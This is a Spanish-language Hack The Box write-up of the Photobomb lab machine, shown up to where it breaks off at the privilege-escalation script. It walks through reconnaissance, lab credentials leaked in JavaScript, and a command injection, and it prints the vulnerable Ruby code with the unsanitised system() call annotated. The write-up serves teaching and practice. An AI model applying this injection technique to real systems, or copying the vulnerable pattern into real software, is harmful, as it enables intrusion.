<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="Hackthebox Writeup Photobomb" /><meta property="og:locale" content="en" /><meta name="description" content="Overview" /><meta property="og:description" content="Overview" /><link rel="canonical" href="https://e1p0tr0.github.io/posts/HTBPhotobomb/" /><meta property="og:url" content="https://e1p0tr0.github.io/posts/HTBPhotobomb/" /><meta property="og:site_name" content="Marss" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-11-02T16:55:16-05:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Hackthebox Writeup Photobomb" /><meta name="twitter:site" content="@twitter_username" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2023-10-25T20:07:01-05:00","datePublished":"2022-11-02T16:55:16-05:00","description":"Overview","headline":"Hackthebox Writeup Photobomb","mainEntityOfPage":{"@type":"WebPage","@id":"https://e1p0tr0.github.io/posts/HTBPhotobomb/"},"url":"https://e1p0tr0.github.io/posts/HTBPhotobomb/"}</script><title>Hackthebox Writeup Photobomb | Marss</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Marss"><meta name="application-name" content="Marss"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get MODE_ATTR() { return "data-mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } static get ID() { return "mode-toggle"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } let self = this; /* always follow the system prefers */ this.sysDarkPrefers.addEventListener("change", () => { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.notify(); }); } /* constructor() */ get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; } get isLightMode() { return this.mode === ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer)) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } setDark() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_ATTR); sessionStorage.removeItem(ModeToggle.MODE_KEY); } /* Notify another plugins that the theme mode has changed */ notify() { window.postMessage({ direction: ModeToggle.ID, message: this.modeStatus }, "*"); } } /* ModeToggle */ const toggle = new ModeToggle(); function flipMode() { if (toggle.hasMode) { if (toggle.isSysDarkPrefer) { if (toggle.isLightMode) { toggle.clearMode(); } else { toggle.setLight(); } } else { if (toggle.isDarkMode) { toggle.clearMode(); } else { toggle.setDark(); } } } else { if (toggle.isSysDarkPrefer) { toggle.setLight(); } else { toggle.setDark(); } } toggle.notify(); } /* flipMode() */ </script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src=" /assets/img/avatar/avatar.jpg " alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Marss</a></div><div class="site-subtitle font-italic">Freelance Professional [eJPTv2]</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <button class="mode-toggle btn" aria-label="Switch Mode"> <i class="fas fa-adjust"></i> </button> <span class="icon-border"></span> <a href="https://github.com/E1P0TR0" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/twitter_username" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['marsello.guillen','gmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>Hackthebox Writeup Photobomb</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Hackthebox Writeup Photobomb</h1><div class="post-meta text-muted"><div> By <em> <a href="https://twitter.com/username">Marsello Guill√©n</a> </em></div><div class="d-flex"><div> <span> Posted <em class="timeago" data-ts="1667426116" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2022-11-02 </em> </span> <span> Updated <em class="timeago" data-ts="1698282421" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2023-10-25 </em> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="2349 words"> <em>13 min</em> read</span></div></div></div><div class="post-content"><h1 id="overview">Overview</h1><ol><li>Http authentication credentials by <strong>Information leak</strong> in a server file<li><strong>Command Inyection</strong> by unsanitized user input on file download (Foothold)<li><strong>Path Hijacking</strong> to remote command execution as a privileged user by a bash script (Privilege Escalation)</ol><p><img data-src="/assets/img/htb/writeups/photobomb/logo.png" alt="Logo" class="shadow" data-proofer-ignore></p><div class="table-wrapper"><table><thead><tr><th style="text-align: center">OS<th style="text-align: center">IP<th style="text-align: center">Release Date<th style="text-align: center">Difficulty<th style="text-align: center">Points<tbody><tr><td style="text-align: center">Linux<td style="text-align: center">10.10.11.182<td style="text-align: center">08 Oct 2022<td style="text-align: center">Easy<td style="text-align: center">20</table></div><hr /><p>Antes de empezar verificamos que estamos conectado a la <strong>VPN</strong> de HTB y tenemos conexi√≥n con la m√°quina:</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre><span class="o">&gt;</span> ping <span class="nt">-c1</span> 10.10.11.182
PING 10.10.11.182 <span class="o">(</span>10.10.11.182<span class="o">)</span> 56<span class="o">(</span>84<span class="o">)</span> bytes of data.
64 bytes from 10.10.11.182: <span class="nv">icmp_seq</span><span class="o">=</span>1 <span class="nv">ttl</span><span class="o">=</span>63 <span class="nb">time</span><span class="o">=</span>102 ms
                                          <span class="se">\_</span>_____________________ Linux Machine
<span class="nt">---</span> 10.10.11.182 ping statistics <span class="nt">---</span>
1 packets transmitted, 1 received, 0% packet loss, <span class="nb">time </span>0ms
          <span class="se">\_</span>________________<span class="se">\_</span>___________________________________ Successful connection
rtt min/avg/max/mdev <span class="o">=</span> 101.974/101.974/101.974/0.000 ms
</pre></table></code></div></div><blockquote><p>Explicaci√≥n de par√°metros:</p><p>-c &lt;count&gt; : N√∫mero de paquetes ICMP que deseamos enviar a la m√°quina</p></blockquote><h2 id="enumeration"><span class="mr-2">Enumeration</span><a href="#enumeration" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><hr /><p>Empezamos con la fase de reconocimiento haciendo un escaneo de tipo <strong>TCP (Transfer Control Protocol)</strong> para descubrir los puertos abiertos de la m√°quina:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre><span class="go">‚ùØ nmap -p- --open -sS --min-rate 5000 -n -Pn 10.10.11.182
Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-02 17:04 -05
Nmap scan report for 10.10.11.182
Host is up (0.12s latency).
Not shown: 65140 closed tcp ports (reset), 393 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE
22/tcp open  ssh
              \_________________ Secure Shell Protocol
80/tcp open  http
              \_________________ Hypertext Transfer Protocol
</span></pre></table></code></div></div><blockquote class="prompt-info"><div><p>Explicaci√≥n de par√°metros :</p></div></blockquote><blockquote><p>-p- : Escanear todos los puertos, del 1 al 65,535</p><p>‚Äìopen : Escanear solo puertos abiertos</p><p>-sS : Solo enviar paquetes de tipo SYN (inicio de conexi√≥n), incrementa velocidad del escaneo</p><p>--min-rate &lt;number&gt; : Enviar una taza (&lt;number&gt;) de paquetes por segundo como m√≠nimo</p><p>-n : No buscar nombres de dominio asociadas a la IP en cuesti√≥n (rDNS)</p><p>-Pn : Omitir el descubrimiento de hosts y continuar con el escaneo de puertos, incrementa velocidad del escaneo</p></blockquote><p>Ahora escaneamos m√°s a fondo para enumerar que servicios corren por detr√°s de los puertos <strong>22(SSH)</strong> - <strong>80(HTTP)</strong>:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre><td class="rouge-code"><pre><span class="go">‚ùØ nmap -p22,80 -sCV 10.10.11.182 -oN open_ports_TCP
Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-02 17:08 -05
Nmap scan report for photobomb.htb (10.10.11.182)
Host is up (0.10s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux, protocol 2.0)
| ssh-hostkey: 
|   3072 e22473bbfbdf5cb520b66876748ab58d (RSA)
|   256 04e3ac6e184e1b7effac4fe39dd21bae (ECDSA)
|_  256 20e05d8cba71f08c3a1819f24011d29e (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Photobomb
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux, CPE: cpe:/o:linux:linux_kernel
</span></pre></table></code></div></div><blockquote class="prompt-info"><div><p>Explicaci√≥n de par√°metros :</p></div></blockquote><blockquote><p>-p &lt;port_1,port_2,...&gt; : Indicamos que puertos queremos escanear</p><p>-sCV (Fusi√≥n de par√°metros -sC -sV)</p><p>-sC : Ejecutar en los puertos scripts por defecto de nmap</p><p>-sV : Activar detecci√≥n de versiones de los servicios que corren por los puertos</p><p>-oN &lt;file&gt; : Guardar el output del escaneo en un archivo con formato Nmap</p></blockquote><p>Ya que no disponemos de credenciales omitimos el puerto <strong>22 (SSH)</strong> y empezamos escaneando el las tecnologias del servicio web en el puerto <strong>80 (HTTP)</strong>:</p><blockquote><p>Usando <code class="language-plaintext highlighter-rouge">whatweb</code></p></blockquote><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="go">‚ùØ whatweb 10.10.11.182
http://10.10.11.182 [302 Found] Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.182], RedirectLocation[http://photobomb.htb/], Title[302 Found], nginx[1.18.0]
ERROR Opening: http://photobomb.htb/ - no address for photobomb.htb &lt;-- Redirection
</span></pre></table></code></div></div><blockquote class="prompt-info"><div><p>Si prefieres una herramienta con interfaz mas amigable puedes usar la extensi√≥n <a href="https://www.wappalyzer.com/apps/">Wappalyzer</a></p></div></blockquote><p>Observamos que tenemos un <strong>c√≥digo de estado 302 (Moved Temporarily)</strong>, el cu√°l es un <strong>mensaje de redirecci√≥n</strong> que ocurre cuando el recurso que solicitamos ha sido temporalmente movido a otra ubicaci√≥n</p><p>En esta ocasi√≥n al intentar ingresar al servicio web <code class="language-plaintext highlighter-rouge">http://10.10.11.182</code> existe una redirecci√≥n hacia <code class="language-plaintext highlighter-rouge">http://photobomb.htb</code>, √©l cual es un <strong>nombre de dominio</strong> que usa el sistema <strong>Domain Name System (DNS)</strong> que nos facilita la b√∫squeda de cualquier recurso en internet y as√≠ no estar escribiendo la direcci√≥n ip en cuesti√≥n</p><p>Adem√°s, existe una relaci√≥n con el concepto de <strong>Virtual Hosting</strong>, el cu√°l nos permite asociar a una misma direcci√≥n ip varios <strong>nombres de dominios</strong> donde cada uno de estos sea un servicio web completamente diferente a los dem√°s. Para que nosotros podamos acceder a este dominio necesitamos asociarla con su respectiva ip, por ello debemos agregar est√° informaci√≥n a nuestro archivo del sistema <strong>encargado de asociar/resolver/apuntar una ip a un nombre de dominio</strong> <em>/etc/hosts</em> : <code class="language-plaintext highlighter-rouge">echo '10.10.11.182 photobomb.htb' &gt;&gt; /etc/hosts</code></p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="go">‚ùØ whatweb 10.10.11.182
http://10.10.11.182 [302 Found] Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.182], RedirectLocation[http://photobomb.htb/], Title[302 Found], nginx[1.18.0]
</span><span class="gp">http://photobomb.htb/ [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.182], Script, Title[Photobomb], UncommonHeaders[x-content-type-options], X-Frame-Options[SAMEORIGIN], X-XSS-Protection[1;</span><span class="w"> </span><span class="nv">mode</span><span class="o">=</span>block], nginx[1.18.0]
</pre></table></code></div></div><p>Observamos que ahora podemos resolver de manera correcta el nombre de dominio <code class="language-plaintext highlighter-rouge">photobomb.htb</code> y con ello poder enumerar las tecnolog√≠as y sus respectivas versiones para inicialmente, a manera general, buscar vulnerabilidades existentes</p><p>Con el conocimiento previo de las tecnolog√≠as procedemos a visualizar la interfaz de la web:</p><blockquote><p>Usando el navegador <code class="language-plaintext highlighter-rouge">chromium</code></p></blockquote><p><img data-src="/assets/img/htb/writeups/photobomb/photobomb_htb.png" alt="Photobomb.htb" class="shadow" data-proofer-ignore></p><p>De primeras observamos un mensaje de bienvenida y el mensaje <em>To get started, please click here! (the credentials are in your welcome pack)</em> que si hacemos <strong>Hoovering</strong> sobre el <strong>Hyperlink</strong> observamos que nos redirige hacia <code class="language-plaintext highlighter-rouge">photobomb.htb/printer</code> y justamente nos pide unas credenciales:</p><p><img data-src="/assets/img/htb/writeups/photobomb/photobomb_htb_printer-login.png" alt="Photobomb.htb/printer_login" class="shadow" data-proofer-ignore></p><p>Ya que nos disponemos de ningun pack de bienvenida, podemos seguir enumerando los recursos que se cargan al entrar a la web:</p><blockquote><p>Web Development Tools <code class="language-plaintext highlighter-rouge">Network</code></p></blockquote><p><img data-src="/assets/img/htb/writeups/photobomb/photobomb_htb_devtools.png" alt="Photobomb.htb_devtools" class="shadow" data-proofer-ignore></p><p>Observamos por la pesta√±a <code class="language-plaintext highlighter-rouge">Initiator</code> que uno de los archivos que se cargan al iniciar la p√°gina actual (index) es <code class="language-plaintext highlighter-rouge">photobomb.js</code>, y relacionando con el mensaje del pack de bienvenida, examinamos su contenido y encontramos lo siguiente:</p><blockquote><p>Web Development Tools <code class="language-plaintext highlighter-rouge">Sources</code></p></blockquote><p><img data-src="/assets/img/htb/writeups/photobomb/photobomb_htb_photobomb_js.png" alt="Photobomb.htb_photobomb.js" class="shadow" data-proofer-ignore></p><p>Vemos que hace un <strong>match</strong> de nuestras <code class="language-plaintext highlighter-rouge">cookies</code> usando <em>expresiones regulares</em> para validar que si tenemos una cookie con el nombre <code class="language-plaintext highlighter-rouge">isPhotoBombTechSupport</code> y cualquier valor, entonces se cambiar√° el <strong>Hyperlink</strong> que teniamos antes (http://photobomb/printer) a <code class="language-plaintext highlighter-rouge">http://pH0t0:b0Mb!@photobomb.htb/printer</code> que es una manera de authenticaci√≥n por <strong>HTTP</strong> (lo mismo que poner las credenciales en el cuadro anterior)</p><blockquote class="prompt-info"><div><p>Tambi√©n podemos crear una cookie <strong>isPhotoBombTechSupport=anything</strong>, recargar y dirigirnos a <code class="language-plaintext highlighter-rouge">/printer</code></p></div></blockquote><blockquote class="prompt-tip"><div><p>Si quieres aprender como usar <em>expresiones regulares</em> te recomiendo est√° p√°gina muy interactiva: <a href="https://regexone.com">https://regexone.com</a></p></div></blockquote><h2 id="foothold"><span class="mr-2">Foothold</span><a href="#foothold" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><hr /><p>Ahora solo entramos a la ruta <code class="language-plaintext highlighter-rouge">/printer</code> y tenemos la siguiente interfaz:</p><p><img data-src="/assets/img/htb/writeups/photobomb/photobomb_htb_printer.png" alt="Photobomb.htb/printer" class="shadow" data-proofer-ignore></p><p>Examinando la web sabemos que tiene la funcionalidad de descargar las im√°genes de la p√°gina. Por ello, siempre que tengamos est√° funcinalidad de <strong>subir o descargar un archivo</strong> es importante analizar que el lo que se env√≠a por la petici√≥n. Para ello procedemos a interceptar la petici√≥n:</p><blockquote><p>Usando <code class="language-plaintext highlighter-rouge">burpsuite</code> como proxy intermediario</p></blockquote><p><img data-src="/assets/img/htb/writeups/photobomb/photobomb_printer_burpsuite.png" alt="Photobomb.htb/printer_burpsuite" data-proofer-ignore></p><p>Observamos que en la petici√≥n por <strong>POST</strong> se pasan los par√°metros <code class="language-plaintext highlighter-rouge">photo</code>, <code class="language-plaintext highlighter-rouge">filetype</code> y <code class="language-plaintext highlighter-rouge">dimensions</code>. Probando cambiar los valores para apuntar a otro archivo local o cambiar el nombre de los par√°metros con el objetivo de generar alg√∫n error, obtuve lo siguiente:</p><p><img data-src="/assets/img/htb/writeups/photobomb/photobomb_printer_sinatra_error.png" alt="Photobomb.htb_sinatra_error" class="shadow" data-proofer-ignore></p><blockquote class="prompt-info"><div><p>Este error es parte de una configuraci√≥n del Framework minimalista <code class="language-plaintext highlighter-rouge">Sinatra</code> del lenguaje <code class="language-plaintext highlighter-rouge">Ruby</code> que nos sirve para construir aplicaciones web del lado del servidor (backend). Obviamente comparte informaci√≥n sensible que pueden aprovecar los atacantes</p></div></blockquote><p>Solo podemos ver parte del c√≥digo donde se valida el parametro <code class="language-plaintext highlighter-rouge">filetype</code> con la <em>expresi√≥n regular</em> <code class="language-plaintext highlighter-rouge">^(png|jpg)</code> lo c√∫al solo permite como v√°lido cualquier cadena que empiece por <code class="language-plaintext highlighter-rouge">png</code> o <code class="language-plaintext highlighter-rouge">jpg</code>, lo c√∫al es bastando peligroso, probemos esto:</p><p><img data-src="/assets/img/htb/writeups/photobomb/photobomb_printer_filetype_test_burpsuite.png" alt="Photobomb.htb/printer_filetype_test_burpsuite.png" class="shadow" data-proofer-ignore></p><p>Validamos la visualizaci√≥n de nuestro input, por ello podemos pensar en la vulnerabilidad de <strong>Command Inyection</strong> que nos permite como atacante <strong>ejecutar comandos en el sistema operativo</strong> que por detr√°s est√© usando el input del usuario en funciones como <code class="language-plaintext highlighter-rouge">system()</code> o <code class="language-plaintext highlighter-rouge">exec()</code>. Para ello hacemos una <strong>Prueba de concepto (Proff of concept)</strong>:</p><blockquote><p>Nos ponemos en escucha con <code class="language-plaintext highlighter-rouge">tcpdump</code> y pasamos como input una traza ICMP con <code class="language-plaintext highlighter-rouge">ping</code> hacia nuestra IP</p></blockquote><p><img data-src="/assets/img/htb/writeups/photobomb/command_injection_poc.png" alt="Photobomb_command_injection_POC" data-proofer-ignore></p><blockquote class="prompt-info"><div><p>Tienes mas informaci√≥n en Hacktricks sobre la vulnerabilidad <a href="https://book.hacktricks.xyz/pentesting-web/command-injection">Command Inyection</a></p></div></blockquote><p>Ya que tenemos ejecuci√≥n remota de comandos, solo nos queda inyectar una <strong>reverse shell</strong> con bash, entrar como el usuario <code class="language-plaintext highlighter-rouge">wizard</code> y conseguimos la flag:</p><p><img data-src="/assets/img/htb/writeups/photobomb/photobomb_foothold.png" alt="Phtobomb_footold" class="shadow" data-proofer-ignore></p><p>Ya que tenemos acceso al sistema, repasemos las malas pr√°cticas que nos permitieron el acceso:</p><blockquote><p>(1) Exponer en scripts sobre la funcionalidad de la web informaci√≥n sensible como credenciales (file: photobomb.js)</p></blockquote><blockquote><p>(2) No sanitizar correctamente el input del usuario (file: /home/wizard/photobomb/server.rb)</p></blockquote><div class="language-ruby highlighter-rouge"><div class="code-header"> <span data-label-text="Ruby"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
</pre><td class="rouge-code"><pre><span class="c1"># ...</span>
<span class="k">if</span> <span class="o">!</span><span class="n">filetype</span><span class="p">.</span><span class="nf">match</span><span class="p">(</span><span class="sr">/^(png|jpg)/</span><span class="p">)</span> <span class="o">&lt;---</span> <span class="no">Here</span> <span class="p">(</span><span class="mi">1</span><span class="p">)</span>
    <span class="n">halt</span> <span class="mi">500</span><span class="p">,</span> <span class="s1">'Invalid filetype.'</span>
  <span class="k">end</span>

  <span class="k">if</span> <span class="o">!</span><span class="n">dimensions</span><span class="p">.</span><span class="nf">match</span><span class="p">(</span><span class="sr">/^[0-9]+x[0-9]+$/</span><span class="p">)</span>
    <span class="n">halt</span> <span class="mi">500</span><span class="p">,</span> <span class="s1">'Invalid dimensions.'</span>
  <span class="k">end</span>

  <span class="k">case</span> <span class="n">filetype</span>
  <span class="k">when</span> <span class="s1">'png'</span>
    <span class="n">content_type</span> <span class="s1">'image/png'</span>
  <span class="k">when</span> <span class="s1">'jpg'</span>
    <span class="n">content_type</span> <span class="s1">'image/jpeg'</span>
  <span class="k">end</span>

  <span class="n">filename</span> <span class="o">=</span> <span class="n">photo</span><span class="p">.</span><span class="nf">sub</span><span class="p">(</span><span class="s1">'.jpg'</span><span class="p">,</span> <span class="s1">''</span><span class="p">)</span> <span class="o">+</span> <span class="s1">'_'</span> <span class="o">+</span> <span class="n">dimensions</span> <span class="o">+</span> <span class="s1">'.'</span> <span class="o">+</span> <span class="n">filetype</span> <span class="p">(</span><span class="mi">2</span><span class="p">)</span>
  <span class="n">response</span><span class="p">[</span><span class="s1">'Content-Disposition'</span><span class="p">]</span> <span class="o">=</span> <span class="s2">"attachment; filename=</span><span class="si">#{</span><span class="n">filename</span><span class="si">}</span><span class="s2">"</span>

  <span class="k">if</span> <span class="o">!</span><span class="no">File</span><span class="p">.</span><span class="nf">exists?</span><span class="p">(</span><span class="s1">'resized_images/'</span> <span class="o">+</span> <span class="n">filename</span><span class="p">)</span>
    <span class="n">command</span> <span class="o">=</span> <span class="s1">'convert source_images/'</span> <span class="o">+</span> <span class="n">photo</span> <span class="o">+</span> <span class="s1">' -resize '</span> <span class="o">+</span> <span class="n">dimensions</span> <span class="o">+</span> <span class="s1">' resized_images/'</span> <span class="o">+</span> <span class="n">filename</span> <span class="p">(</span><span class="mi">3</span><span class="p">)</span>
    <span class="nb">puts</span> <span class="s2">"Executing: </span><span class="si">#{</span><span class="n">command</span><span class="si">}</span><span class="s2">"</span>
    <span class="nb">system</span><span class="p">(</span><span class="n">command</span><span class="p">)</span> <span class="o">&lt;---</span> <span class="no">COMMAND</span> <span class="no">EXECUTION</span> <span class="p">(</span><span class="mi">4</span><span class="p">)</span>
  <span class="k">else</span>
    <span class="nb">puts</span> <span class="s2">"File already exists."</span>
  <span class="k">end</span>
<span class="c1"># ...</span>
</pre></table></code></div></div><h2 id="privilege-escalation"><span class="mr-2">Privilege Escalation</span><a href="#privilege-escalation" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><hr /><p>Empezamos con una enumeraci√≥n b√°sica del sistema como usuarios <code class="language-plaintext highlighter-rouge">wizard</code>, y r√°pidamente listando los comandos, con sus respectivos permisos, que podemos ejecutar <code class="language-plaintext highlighter-rouge">sudo -l</code> encontramos lo siguiente:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre><span class="gp">wizard@photobomb:~/photobomb$</span><span class="w"> </span><span class="nb">sudo</span> <span class="nt">-l</span>
<span class="go">Matching Defaults entries for wizard on photobomb:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User wizard may run the following commands on photobomb:
    (root) SETENV: NOPASSWD: /opt/cleanup.sh
</span></pre></table></code></div></div><p>Obervamos que podemos ejecutar el binario <code class="language-plaintext highlighter-rouge">/opt/cleanup.sh</code> como el usuario <code class="language-plaintext highlighter-rouge">root</code> y se asigna los tags <code class="language-plaintext highlighter-rouge">SETENV</code> <strong>(sirve para asignar variables de entorno)</strong> y <code class="language-plaintext highlighter-rouge">NOPASSWD</code> <strong>(ejecutar el comando sin requerir una contrase√±a)</strong>. Veamos el contenido del archivo:</p><blockquote><p>file: <code class="language-plaintext highlighter-rouge">/opt/cleanup.sh</code></p></blockquote><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre><span class="c">#!/bin/bash</span>
<span class="nb">.</span> /opt/.bashrc
